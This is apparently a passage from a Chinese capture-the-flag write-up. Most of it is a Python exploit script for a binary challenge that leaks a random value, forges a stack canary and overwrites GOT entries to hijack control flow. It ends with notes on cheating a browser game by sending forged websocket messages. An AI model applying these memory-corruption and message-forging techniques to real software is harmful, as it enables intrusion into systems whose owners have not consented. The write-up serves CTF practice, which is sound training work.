           sub_quit(io)
           #prepare
           seq = ["1"] * 6
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           seq = ["1"] * 2
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           clear(io)
           seq = ["1"] * 2
           sort(io, seq)
           sub_sort(io)
           rand_val_addr = 0x0804C04C
           sub_update(io, 2, rand_val_addr)
           sub_quit(io)
           history(io)
           io.read_until("[*L*] ID = 0")
           io.read_until("Len = ")
           data = int(io.read_until(", Data")[:-6])
           rand_val_addr = struct.unpack("I", struct.pack("i", data))[0]
           print "rand_val_addr:", hex(rand_val_addr)
           #io.gdb_hint()
           ###
           seq = ["1"] * 6
           sort(io, seq)
           sub_sort(io)
           print "canary:", hex(0xfffffffe ^ rand_val_addr)
           canary = struct.unpack("i", struct.pack("I", 0xfffffffe ^ rand_val_addr))[0]
           sub_update(io, 0, -2 )
           sub_update(io, 1, canary)
           zero_area = data_buff + (22) * 4
           sub_update(io, 6, zero_area)
           sub_quit(io)
           history(io)
           #io.read_until("ID = 1")
           #io.read_until("Data = 2 ")
           #data = int(io.read_until(" ")[:-1])
           #heap_addr = struct.unpack("I", struct.pack("i", data))[0]
           #print "heap_addr:", hex(heap_addr)
           #data_buff = heap_addr - 0x08
           #print "data_buff:", hex(data_buff)
           seq = ["1"] * 2
           count = struct.unpack("i", struct.pack("I", 8 ^ rand_val_addr))[0]
           sort(io, seq)
           sub_sort(io)
           sub_update(io, 2, count)
           sub_quit(io)
           #io.gdb_hint()
           t_reload(io, 2)
           #io.interact()
           sub_query(io, 100)
           strtol_got = 0x0804c01c
           puts_got = 0x0804c034
           print "puts_got:", hex(puts_got)
           global_addr = (data_buff & 0xfffff000) + 0x100a0
           print "global_addr:", hex(global_addr)
           diff_index = (0x100a0 - (0x048 + 8)) / 4
           extern_addr = global_addr - 0x500
           other_addr = global_addr - 0x400
           other_index = diff_index - 0x400 / 4
           extern_got = global_addr - 0x550
           sub_update(io, diff_index + 0, 0x8)
           sub_update(io, diff_index + 1, 0x0)
           sub_update(io, diff_index + 2, extern_addr)
           sub_update(io, diff_index + 3, other_addr)
           sub_update(io, other_index + 0, 0x8)
           sub_update(io, other_index + 1, 0x0)
           sub_update(io, other_index + 2, extern_addr + 0x08)
           sub_update(io, other_index + 3, other_addr + 0x10)
           sub_update(io, other_index + 4, 0x8)
           sub_update(io, other_index + 5, 0x0)
           sub_update(io, other_index + 6, extern_addr + 0x10)
           sub_update(io, other_index + 7, other_addr + 0x20)
           sub_update(io, other_index + 8, 0x10)
           sub_update(io, other_index + 9, 0x0)
           sub_update(io, other_index + 10, puts_got - 0xC)
           sub_update(io, other_index + 11, other_addr + 0x30)
           sub_update(io, other_index + 12, 0x10)
           sub_update(io, other_index + 13, 0x0)
           sub_update(io, other_index + 14, extern_got)
           sub_update(io, other_index + 15, other_addr + 0x40)
           sub_update(io, other_index + 16, 0x10)
           sub_update(io, other_index + 17, 0x0)
           sub_update(io, other_index + 18, strtol_got - 0xC)
           sub_update(io, other_index + 19, 0)
           """
           sub_update(io, diff_index + 12, 0x10)
           sub_update(io, diff_index + 13, 0x0)
           sub_update(io, diff_index + 14, extern_got)
           sub_update(io, diff_index + 15, global_addr + 0x30)
           sub_update(io, diff_index + 16, 0x10)
           sub_update(io, diff_index + 17, 0x0)
           sub_update(io, diff_index + 18, strtol_got - 0xC)
           sub_update(io, diff_index + 19, 0)
           """
           sub_quit(io)
           seq = ['1', '%d'%(0x08048776)]
           io.gdb_hint()
           sort(io, seq)
           #if diff temp1:
                 maxtemp=temp2
             return d^maxtemp
       print hex(int(calcf("7")))[2:-1].decode("hex")
###  
**这个游戏很好玩啊 hhhh300 Hungry Game**
首先看js 用socket跳关
data = JSON.stringify([msg('next', {})]);
ws.send(data);
连跳两关之后需要采木头
data = JSON.stringify([msg('wood', {'time': 1e10})]);
ws.send(data);
下一关是钻石。。 一次最多50个，需要写循环（完全MC即视感）
    for(var i=0;i<500;i++){
       data = JSON.stringify([msg('diamond', {
                                              'count': 20
                                              })]);
                                              ws.send(data);
                                                }
最后打BOSS 这个靠脸。。 我打了四次才过去。